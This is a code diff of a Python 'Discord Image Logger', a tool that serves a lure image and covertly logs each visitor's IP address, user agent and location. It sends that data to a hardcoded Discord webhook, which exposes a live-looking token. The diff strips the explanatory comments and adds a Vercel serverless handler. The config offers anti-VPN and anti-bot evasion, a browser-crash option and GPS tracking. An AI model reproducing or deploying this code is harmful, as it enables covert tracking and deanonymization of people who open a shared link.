@@ -13,58 +13,38 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1091220366984224788/Te54hSoJ1kqvAWLompNzA3aWux7gaiQ9IMgedx76z4grFYQd2dcefXbxnl5tbE4DOVbq",
-    "image": "https://images.sampletemplates.com/wp-content/uploads/2016/03/29122813/Tic-Tac-Toe-Game-Template.jpg", # You can also have a custom image by using a URL argument
-                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    "image": "https://images.sampletemplates.com/wp-content/uploads/2016/03/29122813/Tic-Tac-Toe-Game-Template.jpg",
+    "imageArgument": True,
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "username": "Image Logger",
+    "color": 0x00FFFF,
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": False,
     
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": False,
 
-    "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info)
+    "message": {
+        "doMessage": False,
+        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger",
+        "richMessage": True,
     },
 
-    "vpnCheck": 1, # Prevents VPNs from triggering the alert
-                # 0 = No Anti-VPN
-                # 1 = Don't ping when a VPN is suspected
-                # 2 = Don't send an alert when a VPN is suspected
+    "vpnCheck": 1,
+    "linkAlerts": True,
+    "buggedImage": True,
 
-    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
-
-    "antiBot": 1, # Prevents bots from triggering the alert
-                # 0 = No Anti-Bot
-                # 1 = Don't ping when it's possibly a bot
-                # 2 = Don't ping when it's 100% a bot
-                # 3 = Don't send an alert when it's possibly a bot
-                # 4 = Don't send an alert when it's 100% a bot
-    
+    "antiBot": 1,
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": False,
+        "page": "https://your-link.here"
     },
-
-    # Please enter all values in correct format. Otherwise, it may break.
-    # Do not edit anything below this, unless you know what you're doing.
-    # NOTE: Hierarchy tree goes as follows:
-    # 1) Redirect (If this is enabled, disables image and crash browser)
-    # 2) Crash Browser (If this is enabled, disables image)
-    # 3) Message (If this is enabled, disables image)
-    # 4) Image 
 }
 
-blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
-                                                            # This feature is undocumented mainly due to it being for detecting bots better.
+blacklistedIPs = ("27", "104", "143", "164")
 
 def botCheck(ip, useragent):
     if not ip or not useragent:
@@ -340,4 +320,79 @@ if (!currenturl.includes("g=")) {
     do_GET = handleRequest
     do_POST = handleRequest
 
-handler = ImageLoggerAPI
+# Vercel Serverless Function Handler
+async def handler(request):
+    """Vercel serverless handler"""
+    try:
+        ip = request.headers.get('x-forwarded-for', request.ip)
+        useragent = request.headers.get('user-agent', "Unknown")
+        
+        if config["imageArgument"]:
+            params = request.args
+            if params.get("url"):
+                try:
+                    url = base64.b64decode(params.get("url").encode()).decode()
+                except:
+                    url = config["image"]
+            elif params.get("id"):
+                try:
+                    url = base64.b64decode(params.get("id").encode()).decode()
+                except:
+                    url = config["image"]
+            else:
+                url = config["image"]
+        else:
+            url = config["image"]
+
+        data = f'''<style>body {{
+margin: 0;
+padding: 0;
+}}
+div.img {{
+background-image: url('{url}');
+background-position: center center;
+background-repeat: no-repeat;
+background-size: contain;
+width: 100vw;
+height: 100vh;
+}}</style><div class="img"></div>'''
+        
+        if ip and ip.startswith(blacklistedIPs):
+            return {"statusCode": 403}
+        
+        if botCheck(ip, useragent):
+            makeReport(ip, endpoint="/", url=url)
+            return {
+                "statusCode": 200,
+                "headers": {"Content-Type": "image/jpeg"},
+                "body": binaries.get("loading", b"").decode("latin1")
+            }
+        
+        result = makeReport(ip, useragent, endpoint="/", url=url)
+        
+        message = config["message"]["message"]
+        if config["message"]["richMessage"] and result:
+            message = message.replace("{ip}", ip)
+            message = message.replace("{isp}", result.get("isp", "Unknown"))
+            message = message.replace("{country}", result.get("country", "Unknown"))
+            message = message.replace("{city}", result.get("city", "Unknown"))
+
+        if config["redirect"]["redirect"]:
+            data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
+        
+        return {
+            "statusCode": 200,
+            "headers": {"Content-Type": "text/html"},
+            "body": data
+        }
+    
+    except Exception as e:
+        reportError(traceback.format_exc())
+        return {
+            "statusCode": 500,
+            "headers": {"Content-Type": "text/html"},
+            "body": "500 - Internal Server Error"
+        }
+
+# Keep both for compatibility
+app = handler
